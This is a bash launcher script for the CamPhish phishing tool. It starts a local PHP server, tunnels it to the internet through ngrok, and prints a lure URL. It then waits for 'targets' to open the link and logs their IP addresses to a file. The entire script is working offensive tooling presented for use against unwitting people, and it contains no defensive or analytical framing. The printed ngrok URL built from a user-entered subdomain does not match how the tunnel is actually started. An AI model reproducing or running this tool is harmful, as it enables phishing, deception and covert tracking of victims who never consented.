#!/bin/bash
# CamPhish v1.7
# Powered by TechChip
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n"; stop' 2

banner() {
    clear
    printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
    printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
    printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
    printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
    printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
    printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
    printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
    printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
    printf " \e[1;93m CamPhish Ver 1.7 \e[0m \n"
    printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n\n"
}

dependencies() {
    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
    command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
    killall -2 php > /dev/null 2>&1
    killall -2 ssh > /dev/null 2>&1
    exit 1
}

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets, Press Ctrl + C to exit...\e[0m\n"
    while true; do
        if [[ -e "ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target Opened The URL!\n"
            catch_ip
            rm -rf ip.txt
        fi
        sleep 1
    done
}

startcamphish() {
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ngrok is starting...\e[0m\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] URL:\e[0m\e[1;77m http://%s.ngrok.io\e[0m\n" $subdomain
    checkfound
}

banner
dependencies

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter subdomain (example: myname123): \e[0m' subdomain
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter site title: \e[0m' title
printf " \n"
startcamphish
